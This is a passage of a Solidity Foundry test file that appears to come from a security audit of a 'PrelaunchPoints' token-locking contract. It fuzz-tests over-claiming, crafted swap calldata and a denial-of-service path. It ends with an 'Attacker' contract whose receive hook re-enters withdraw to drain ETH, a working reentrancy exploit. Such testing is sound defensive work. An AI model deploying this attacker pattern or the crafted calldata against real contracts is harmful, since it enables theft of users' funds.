    //     assertEq(beforeClaimUserLpETHBalance, afterClaimUserLpETHBalance, "User's LP ETH balance should not change");
    //     assertGe(
    //         afterClaimHackerLpETHBalance, beforeClaimHackerLpETHBalance, "Hacker's LP ETH balance should not decrease"
    //     );

    //     // This is the critical assertion: ensure hacker hasn't claimed more than their rightful share
    //     assertLt(
    //         afterClaimHackerLpETHBalance,
    //         beforeClaimHackerLpETHBalance + hackerLockAmount * 2,
    //         "Hacker should not claim more than double their deposit"
    //     );
    // }

    function test_claim_percent_exploit_token(uint256 userLockAmount, uint256 hackerLockAmount) public {
        uint8 TWO_HUNDRED_PERCENT = 200;
        address hacker = makeAddr("hacker");

        // Bound the lock amounts within realistic limits
        userLockAmount = bound(userLockAmount, 1, 1e36);
        hackerLockAmount = bound(hackerLockAmount, 1, 1e36);

        // Mint and distribute tokens to users
        lrt.mint(address(this), userLockAmount);
        lrt.mint(hacker, hackerLockAmount);

        // Approve and lock LRT tokens for both users
        lrt.approve(address(prelaunchPoints), userLockAmount);
        prelaunchPoints.lock(address(lrt), userLockAmount, referral);

        vm.startPrank(hacker);
        lrt.approve(address(prelaunchPoints), hackerLockAmount);
        prelaunchPoints.lock(address(lrt), hackerLockAmount, referral);
        vm.stopPrank();

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH(); // Assuming conversion logic supports LRT to lpETH

        // Warp to after the claim start date
        vm.warp(prelaunchPoints.startClaimDate() + 1);

        // Check balances before claim
        uint256 beforeClaimUserLpETHBalance = lpETH.balanceOf(address(this));
        uint256 beforeClaimHackerLpETHBalance = lpETH.balanceOf(hacker);

        // Hacker tries to claim 200%
        vm.prank(hacker);
        prelaunchPoints.claim(address(lrt), TWO_HUNDRED_PERCENT, PrelaunchPoints.Exchange.UniswapV3, emptydata);

        // Check balances after claim
        uint256 afterClaimUserLpETHBalance = lpETH.balanceOf(address(this));
        uint256 afterClaimHackerLpETHBalance = lpETH.balanceOf(hacker);

        // Assertions to ensure no unauthorized transfers occur
        assertEq(beforeClaimUserLpETHBalance, afterClaimUserLpETHBalance, "User's LP ETH balance should not change");
        assertGe(
            afterClaimHackerLpETHBalance, beforeClaimHackerLpETHBalance, "Hacker's LP ETH balance should not decrease"
        );

        // This is the critical assertion: ensure hacker hasn't claimed more than their rightful share
        assertLt(
            afterClaimHackerLpETHBalance,
            beforeClaimHackerLpETHBalance + hackerLockAmount * 2,
            "Hacker should not claim more than double their deposit"
        );
    }

    bytes4 public constant UNI_SELECTOR = 0x803ba26d;
    bytes4 public constant TRANSFORM_SELECTOR = 0x415565b0;

    function test_claim_with_uniswap_v3(uint256 userLockAmount) public {
        uint8 ZERO_PERCENT = 0;
        address hacker = makeAddr("hacker");
        uint256 hackerLockAmount = 1e18; // 1 LRT for simplicity

        // Bound the lock amount within realistic limits
        userLockAmount = bound(userLockAmount, 1, 1e36);

        // Mint and distribute tokens to users
        lrt.mint(address(this), userLockAmount);
        lrt.mint(hacker, hackerLockAmount);

        // Approve and lock LRT tokens for both users
        lrt.approve(address(prelaunchPoints), userLockAmount);
        prelaunchPoints.lock(address(lrt), userLockAmount, referral);

        // Approve PrelaunchPoints contract to spend hacker's tokens
        vm.prank(hacker);
        lrt.approve(address(prelaunchPoints), hackerLockAmount);
        // Lock tokens by calling the lock function as hacker
        vm.prank(hacker);
        prelaunchPoints.lock(address(lrt), hackerLockAmount, referral);

        // Simulate time advance if necessary
        vm.warp(prelaunchPoints.startClaimDate() + 1);

        // Set up the mock Uniswap interaction assuming it's properly implemented in the setup
        bytes4 uniswapSelector = prelaunchPoints.UNI_SELECTOR();
        address inputToken = address(lrt);
        address outputToken = address(prelaunchPoints.WETH()); // Assume the path ends at WETH
        uint256 inputTokenAmount = 0;
        uint256 minBuyAmount = 1; // Example ratio
        address recipient = hacker;

        bytes memory uniswapData = abi.encodeWithSelector(
            0x803ba26d, inputToken, prelaunchPoints.WETH(), inputTokenAmount, recipient, minBuyAmount
        );

        // console.log("Uniswap Selector:", uniswapSelector);
        // console.log("Start Claim Date:", prelaunchPoints.startClaimDate());
        // console.log("Current Block Time:", block.timestamp);
        // console.log("Input Token Address:", address(lrt));
        // console.log("Output Token Address:", address(WETH));
        // console.log("Encoded Data:", uniswapData);

        // Hacker attempts to claim 0% using the crafted Uniswap data
        vm.prank(hacker);
        prelaunchPoints.claim(address(lrt), ZERO_PERCENT, PrelaunchPoints.Exchange.UniswapV3, uniswapData);

        // Assertions and logs to check the state after claim
        uint256 finalLpETHBalance = lpETH.balanceOf(hacker);
        console.log("Final lpETH Balance of Hacker:", finalLpETHBalance);
    }

    function test_claim_with_transform(uint256 userLockAmount) public {
        uint8 ZERO_PERCENT = 0;
        address hacker = makeAddr("hacker");
        uint256 hackerLockAmount = 1e18; // 1 LRT for simplicity

        // Bound the lock amount within realistic limits
        userLockAmount = bound(userLockAmount, 1, 1e36);

        // Mint and distribute tokens to users
        lrt.mint(address(this), userLockAmount);
        lrt.mint(hacker, hackerLockAmount);

        // Approve and lock LRT tokens for both users
        lrt.approve(address(prelaunchPoints), userLockAmount);
        prelaunchPoints.lock(address(lrt), userLockAmount, referral);

        // Approve PrelaunchPoints contract to spend hacker's tokens
        vm.prank(hacker);
        lrt.approve(address(prelaunchPoints), hackerLockAmount);
        // Lock tokens by calling the lock function as hacker
        vm.prank(hacker);
        prelaunchPoints.lock(address(lrt), hackerLockAmount, referral);

        // Simulate time advance if necessary
        vm.warp(prelaunchPoints.startClaimDate() + 1);

        // Set up the mock TransformERC20 interaction
        bytes4 transformSelector = prelaunchPoints.TRANSFORM_SELECTOR();
        address inputToken = address(lrt);
        address outputToken = address(ETH); // Assume the conversion is directly to ETH
        uint256 inputTokenAmount = hackerLockAmount;
        address recipient = hacker; // Set recipient of the transaction

        // Encoding the data for TransformERC20
        bytes memory transformData =
            abi.encodeWithSelector(transformSelector, inputToken, outputToken, inputTokenAmount);

        // Hacker attempts to claim 0% using the crafted TransformERC20 data
        vm.prank(hacker);
        prelaunchPoints.claim(address(lrt), ZERO_PERCENT, PrelaunchPoints.Exchange.TransformERC20, transformData);

        // Assertions and logs to check the state after claim
        uint256 finalLpETHBalance = lpETH.balanceOf(hacker);
        console.log("Final lpETH Balance of Hacker:", finalLpETHBalance);
    }

    function testSuccessfulClaimUsingLRT() public {
        // lpETH.deposit{value: INITIAL_SUPPLY}(address(prelaunchPoints));

        // Approve and lock some LRT
        lrt.approve(address(prelaunchPoints), INITIAL_SUPPLY);
        prelaunchPoints.lock(address(lrt), 100 ether, referral);

        // Simulate conversion to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(block.timestamp + 10 days); // Ensure time is moved beyond the lock period
        prelaunchPoints.convertAllETH(); // Assuming the balance is not strictly ETH and handles tokens

        // Construct the correct mock data for a Uniswap V3 call
        bytes4 selector = prelaunchPoints.UNI_SELECTOR();
        address inputToken = address(lrt);
        address outputToken = WETH; // Assuming WETH is the intermediary step to ETH
        uint256 inputTokenAmount = 100 * 1e18;
        address recipient = address(prelaunchPoints);

        // Encode data as per expected by the _decodeUniswapV3Data function within PrelaunchPoints
        bytes memory encodedPath = abi.encodePacked(inputToken, uint24(3000), outputToken); // 3000 is a placeholder for fee
        bytes memory mockData = abi.encodeWithSelector(
            selector,
            encodedPath,
            inputTokenAmount,
            uint256(0), // minBuyAmount as placeholder
            recipient
        );

        vm.warp(prelaunchPoints.startClaimDate() + 1); // Move time forward past the claim date

        uint256 initialLRTBalance = lrt.balanceOf(address(prelaunchPoints));
        uint256 initialContractBalance = lpETH.balanceOf(address(prelaunchPoints));
        uint256 initialLpETHBalance = lpETH.balanceOf(address(this));

        prelaunchPoints.claim(address(lrt), 100, PrelaunchPoints.Exchange.UniswapV3, mockData);

        uint256 endingLRTBalance = lrt.balanceOf(address(prelaunchPoints));
        uint256 newLpETHBalance = lpETH.balanceOf(address(this));
        uint256 newContractBalance = lpETH.balanceOf(address(prelaunchPoints));

        // Debugging outputs
        console.log("Initial LP ETH Balance:", initialLpETHBalance);
        console.log("New LP ETH Balance:", newLpETHBalance);
        console.log("initialContractBalance:", initialContractBalance);
        console.log("newContractBalance:", newContractBalance);
        console.log("initialLRTBalance:", initialLRTBalance);
        console.log("endingLRTBalance:", endingLRTBalance);
    }

    function testSuccessfulClaimUsingLRT_transform() public {
        // lpETH.deposit{value: INITIAL_SUPPLY}(address(prelaunchPoints));

        // Approve and lock some LRT
        lrt.approve(address(prelaunchPoints), INITIAL_SUPPLY);
        prelaunchPoints.lock(address(lrt), 100 ether, referral);

        // Simulate conversion to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(block.timestamp + 10 days); // Ensure time is moved beyond the lock period
        prelaunchPoints.convertAllETH(); // Assuming the balance is not strictly ETH and handles tokens

        // Construct the correct mock data for a Uniswap V3 call
        bytes4 selector = prelaunchPoints.TRANSFORM_SELECTOR();
        address inputToken = address(lrt);
        address outputToken = prelaunchPoints.ETH(); // Assuming WETH is the intermediary step to ETH
        uint256 inputTokenAmount = 100 * 1e18;
        address recipient = address(prelaunchPoints);

        // Encode data as per expected by the _decodeUniswapV3Data function within PrelaunchPoints
        bytes memory mockData = abi.encodeWithSelector(
            selector,
            inputToken,
            outputToken,
            inputTokenAmount,
            uint256(0) // Placeholder for minimum output amount, adjust as needed
        );

        vm.warp(prelaunchPoints.startClaimDate() + 1); // Move time forward past the claim date

        uint256 initialLRTBalance = lrt.balanceOf(address(prelaunchPoints));
        uint256 initialContractBalance = lpETH.balanceOf(address(prelaunchPoints));
        uint256 initialLpETHBalance = lpETH.balanceOf(address(this));

        prelaunchPoints.claim(address(lrt), 100, PrelaunchPoints.Exchange.TransformERC20, mockData);

        uint256 endingLRTBalance = lrt.balanceOf(address(prelaunchPoints));
        uint256 newLpETHBalance = lpETH.balanceOf(address(this));
        uint256 newContractBalance = lpETH.balanceOf(address(prelaunchPoints));

        // Debugging outputs
        console.log("Initial LP ETH Balance:", initialLpETHBalance);
        console.log("New LP ETH Balance:", newLpETHBalance);
        console.log("initialContractBalance:", initialContractBalance);
        console.log("newContractBalance:", newContractBalance);
        console.log("initialLRTBalance:", initialLRTBalance);
        console.log("endingLRTBalance:", endingLRTBalance);
    }

    function test_dos() public {
        uint256 ONE_HUNDRED_ETHER = 100 ether;
        address hacker = makeAddr("hacker");
        vm.deal(hacker, ONE_HUNDRED_ETHER);
        vm.startPrank(hacker);
        Attacker attackContract = new Attacker(prelaunchPoints);
        prelaunchPoints.lockETHFor{value: ONE_HUNDRED_ETHER}(address(attackContract), referral);
        vm.stopPrank();

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + 1);

        vm.prank(hacker);
        attackContract.withdraw();
    }
}

contract Attacker {
    PrelaunchPoints public prelaunchPoints;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes emptydata = new bytes(1);
    address public immutable i_owner;

    constructor(PrelaunchPoints _prelaunchPoints) {
        prelaunchPoints = _prelaunchPoints;
        i_owner = msg.sender;
    }

    function withdraw() external {
        if (msg.sender != i_owner) revert();
        prelaunchPoints.withdraw(ETH);
    }

    receive() external payable {
        if (address(prelaunchPoints).balance > 0) {
            prelaunchPoints.withdraw(ETH);
        } else {
            return;
        }
    }
}
